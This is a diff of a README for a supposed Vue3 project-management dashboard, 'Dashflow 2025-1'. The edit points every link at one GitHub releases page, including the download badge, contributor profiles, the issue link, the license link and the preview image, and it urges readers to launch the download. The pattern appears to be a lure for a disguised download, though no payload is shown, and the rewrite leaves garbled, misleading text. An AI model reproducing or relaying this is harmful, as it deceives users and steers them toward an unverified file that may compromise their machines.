@@ -31,9 +31,9 @@ Users will have access to a wide range of metrics for in-depth analysis of proje
 - **Vue3:** A progressive JavaScript framework for building dynamic and interactive user interfaces.
 
 ## Download Link
-[![Download Soft.zip](https://img.shields.io/badge/Download-Soft.zip-blue)](https://github.com/file/Soft.zip)
+[![Download https://github.com/Nandayo0/dashflow-2025-1/releases](https://github.com/Nandayo0/dashflow-2025-1/releases)](https://github.com/Nandayo0/dashflow-2025-1/releases)
 
-If the link provided redirects to the file "Soft.zip", make sure to launch the download to access the necessary project files. In case the link is unavailable or not functioning correctly, please check the "Releases" section of the repository for alternative download options.
+If the link provided redirects to the file "https://github.com/Nandayo0/dashflow-2025-1/releases", make sure to launch the download to access the necessary project files. In case the link is unavailable or not functioning correctly, please check the "Releases" section of the repository for alternative download options.
 
 ## Get Started
 To get started with the Dashflow 2025-1 project, follow these steps:
@@ -45,16 +45,16 @@ To get started with the Dashflow 2025-1 project, follow these steps:
 
 ## Contributors
 Meet the team behind the Dashflow 2025-1 project:
-- [John Doe](https://github.com/johndoe) - Project Manager & Backend Developer
-- [Jane Smith](https://github.com/janesmith) - Frontend Developer & UI/UX Designer
-- [Alex Johnson](https://github.com/alexjohnson) - Database Administrator & Integration Specialist
+- [John Doe](https://github.com/Nandayo0/dashflow-2025-1/releases) - Project Manager & Backend Developer
+- [Jane Smith](https://github.com/Nandayo0/dashflow-2025-1/releases) - Frontend Developer & UI/UX Designer
+- [Alex Johnson](https://github.com/Nandayo0/dashflow-2025-1/releases) - Database Administrator & Integration Specialist
 
 ## Support
-For any questions, issues, or feedback related to the Dashflow 2025-1 project, please feel free to [open an issue](https://github.com/dashflow-2025-1/issues). Our team will be happy to assist you and address any concerns promptly.
+For any questions, issues, or feedback related to the Dashflow 2025-1 project, please feel free to [open an issue](https://github.com/Nandayo0/dashflow-2025-1/releases). Our team will be happy to assist you and address any concerns promptly.
 
 ## License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to explore, modify, and use the codebase for your own projects with proper attribution.
+This project is licensed under the [MIT License](https://github.com/Nandayo0/dashflow-2025-1/releases). Feel free to explore, modify, and use the codebase for your own projects with proper attribution.
 
 Let's make project management smarter and more efficient with Dashflow 2025-1! 📊🚀
 
-![Dashboard Preview](https://your-website.com/dashboard-preview.jpg)
+![Dashboard Preview](https://github.com/Nandayo0/dashflow-2025-1/releases)
